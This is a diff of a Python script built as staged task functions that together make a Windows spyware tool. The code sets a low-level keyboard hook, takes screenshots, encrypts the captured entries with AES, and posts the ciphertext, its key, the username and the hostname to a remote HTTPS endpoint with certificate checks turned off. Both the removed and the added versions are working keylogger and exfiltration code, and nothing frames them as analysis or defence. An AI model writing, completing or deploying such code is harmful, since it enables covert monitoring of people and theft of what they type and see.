@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
-import sys, json, time, threading, ctypes, base64, os, requests, socket
+import sys, json, time, base64, os, socket, requests
 from typing import Dict, Any
 from io import BytesIO
 from PIL import ImageGrab
+import ctypes
+import threading
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
@@ -11,7 +13,6 @@ from requests.exceptions import ConnectionError, Timeout
 # Constants for the hook
 WH_KEYBOARD_LL = 13
 WM_KEYDOWN = 0x0100
-CTRL_CODE = 162
 
 # Define the LowLevelKeyboardProc callback function type
 LowLevelKeyboardProc = ctypes.WINFUNCTYPE(
@@ -21,7 +22,7 @@ LowLevelKeyboardProc = ctypes.WINFUNCTYPE(
     ctypes.wintypes.LPARAM
 )
 
-# Global variable to store the hook ID
+# Store the hook ID globally
 hook_id = None
 
 def keyboard_proc(nCode, wParam, lParam):
@@ -29,7 +30,6 @@ def keyboard_proc(nCode, wParam, lParam):
         # Extract the virtual key code from lParam
         vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.wintypes.DWORD)).contents.value
         print(f"Key pressed: {vk_code}")
-    # Call the next hook in the chain
     return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
@@ -38,7 +38,7 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     global hook_id
     try:
         # Set the hook
-        hook_id = ctypes.windll.user32.SetWindowsHookExA(
+        hook_id = ctypes.windll.user32.SetWindowsHookExW(
             WH_KEYBOARD_LL,
             LowLevelKeyboardProc(keyboard_proc),
             ctypes.windll.kernel32.GetModuleHandleW(None),
@@ -51,9 +51,9 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 
         # Message loop to keep the hook active
         msg = ctypes.wintypes.MSG()
-        while ctypes.windll.user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
+        while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
             ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
-            ctypes.windll.user32.DispatchMessageA(ctypes.byref(msg))
+            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
 
         return {'success': True, 'data': {'hook_id': hook_id, 'active': True},
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
@@ -61,100 +61,100 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
-def low_level_keyboard_proc(nCode, wParam, lParam):
-    if wParam == WM_KEYDOWN:
-        kbd_struct = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong))
-        vk_code = kbd_struct.contents.value
-        if vk_code == CTRL_CODE:
-            print("CTRL key pressed")
-    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
-
-def setup_keyboard_hook():
-    hook = ctypes.windll.user32.SetWindowsHookExA(
-        WH_KEYBOARD_LL,
-        low_level_keyboard_proc,
-        ctypes.windll.kernel32.GetModuleHandleW(None),
-        0
-    )
-    if not hook:
-        print("Failed to set hook")
-        return False
-
-    # Message loop to keep the hook active
-    msg = ctypes.wintypes.MSG()
-    while ctypes.windll.user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
-        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
-        ctypes.windll.user32.DispatchMessageA(ctypes.byref(msg))
-    
-    return True
-
-def capture_screenshot() -> str:
+def capture_screenshot() -> bytes:
+    """Capture a screenshot and return it as a base64 encoded string."""
     try:
         screenshot = ImageGrab.grab()
         buffer = BytesIO()
         screenshot.save(buffer, format='PNG')
         return base64.b64encode(buffer.getvalue()).decode()
     except Exception as e:
-        print(f"Screenshot capture failed: {e}")
         return None
+
+def keyboard_hook():
+    """Set up a low-level keyboard hook."""
+    WH_KEYBOARD_LL = 13
+    WM_KEYDOWN = 0x0100
+
+    def low_level_keyboard_proc(nCode, wParam, lParam):
+        if wParam == WM_KEYDOWN:
+            # Process key press here if needed
+            pass
+        return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)
+
+    hook_proc = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_ulong, ctypes.POINTER(ctypes.c_void_p))(low_level_keyboard_proc)
+    hook_id = ctypes.windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
+
+    if not hook_id:
+        return False
+
+    msg = ctypes.wintypes.MSG()
+    while ctypes.windll.user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
+        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
+        ctypes.windll.user32.DispatchMessageA(ctypes.byref(msg))
+
+    return True
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    images = []
-    timestamps = []
     try:
         # Start the keyboard hook in a separate thread
-        hook_thread = threading.Thread(target=setup_keyboard_hook, daemon=True)
-        hook_thread.start()
+        threading.Thread(target=keyboard_hook, daemon=True).start()
 
-        # Capture screenshots periodically
-        for _ in range(5):  # Capture 5 screenshots for demonstration
-            image = capture_screenshot()
-            if image:
-                images.append(image)
-                timestamps.append(time.time())
-            time.sleep(1)  # Wait 1 second between captures
+        # Capture the screenshot
+        image_data = capture_screenshot()
+        timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
 
-        result = {'images': images, 'timestamps': timestamps}
+        result = {
+            'image_data': image_data,
+            'timestamp': timestamp
+        }
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'images': [], 'timestamps': []},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Extracting input data
-        hook_id = input_data.get('hook_id', 0)
-        active = input_data.get('active', False)
-        images = input_data.get('images', [])
-        timestamps = input_data.get('timestamps', [])
+        # Extract input data
+        hook_id = input_data.get('hook_id')
+        active = input_data.get('active')
+        image_data = bytes.fromhex(input_data.get('image_data', ''))
+        timestamp = input_data.get('timestamp')
 
-        # Initialize the result dictionary
-        result = {
-            'keystrokes': [],
-            'screenshots': [],
-            'timestamps': []
-        }
+        # Prepare entries list
+        entries = []
 
-        # Process data only if the hook is active
+        # Add keystroke data if active
         if active:
-            # Simulate keystroke data capture
-            result['keystrokes'] = [f"Keystroke data for hook {hook_id}"]
+            entries.append({
+                'type': 'keystroke',
+                'hook_id': hook_id,
+                'timestamp': timestamp
+            })
 
-            # Store screenshots and timestamps
-            result['screenshots'] = images
-            result['timestamps'] = timestamps
+        # Add screenshot data
+        entries.append({
+            'type': 'screenshot',
+            'image_data': image_data.hex(),
+            'timestamp': timestamp
+        })
+
+        # Prepare result
+        result = {
+            'entries': entries,
+            'count': len(entries)
+        }
 
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial data on failure
-        return {'success': False, 'data': {'keystrokes': [], 'screenshots': [], 'timestamps': []},
+        # Return partial result on failure
+        return {'success': False, 'data': {'entries': [], 'count': 0},
                 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
@@ -162,37 +162,34 @@ def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Concatenate all buffered data
-        buffered_data = json.dumps({
-            "keystrokes": input_data.get("keystrokes", []),
-            "screenshots": input_data.get("screenshots", []),
-            "timestamps": input_data.get("timestamps", [])
-        }).encode()
+        # Extract entries and count from input_data
+        entries = input_data.get('entries', [])
+        count = input_data.get('count', 0)
 
-        # Generate random AES key and IV
+        # Convert entries to a single bytes object
+        plaintext = json.dumps(entries).encode()
+
+        # Generate random key and IV
         key = get_random_bytes(16)
         iv = os.urandom(16)
 
         # Create AES cipher in CBC mode
         cipher = AES.new(key, AES.MODE_CBC, iv)
 
-        # Pad the buffered data to a 16-byte boundary
-        padded_data = pad(buffered_data, AES.block_size)
+        # Pad plaintext to 16-byte boundary and encrypt
+        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
 
-        # Encrypt the data
-        ciphertext = cipher.encrypt(padded_data)
-
-        # Prepare the result with hex-encoded values
+        # Prepare result with hex-encoded fields
         result = {
-            "ciphertext": ciphertext.hex(),
-            "iv": iv.hex(),
-            "key": key.hex()
+            'ciphertext': ciphertext.hex(),
+            'iv': iv.hex(),
+            'key': key.hex()
         }
 
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial data on failure
+        # Return partial result with encoded=False on failure
         return {'success': False, 'data': {'ciphertext': None, 'iv': None, 'key': None},
                 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
@@ -207,8 +204,8 @@ def task_T5(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         key = bytes.fromhex(input_data.get('key', ''))
 
         # Prepare system information
-        username = socket.gethostname()
-        hostname = socket.getfqdn()
+        username = os.environ.get('USERNAME', 'unknown')
+        hostname = socket.gethostname()
 
         # Prepare payload
         payload = {
@@ -219,23 +216,23 @@ def task_T5(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
             'hostname': hostname
         }
 
-        # Define the remote server URL
-        url = "https://192.168.127.54/api"
+        # Define the target URL
+        url = "https://192.168.129.197/api"
 
-        # Attempt to send the data with retries
-        for attempt in range(3):
+        # Attempt to send data with retries
+        success = False
+        for _ in range(3):
             try:
                 response = requests.post(url, json=payload, timeout=10, verify=False)
                 if response.status_code == 200:
-                    return {'success': True, 'data': {},
-                            'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
+                    success = True
+                    break
             except (ConnectionError, Timeout):
                 time.sleep(5)
 
-        # If all attempts fail, return failure
-        return {'success': False, 'data': {},
+        result = {'success': success}
+        return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
-
     except Exception as e:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
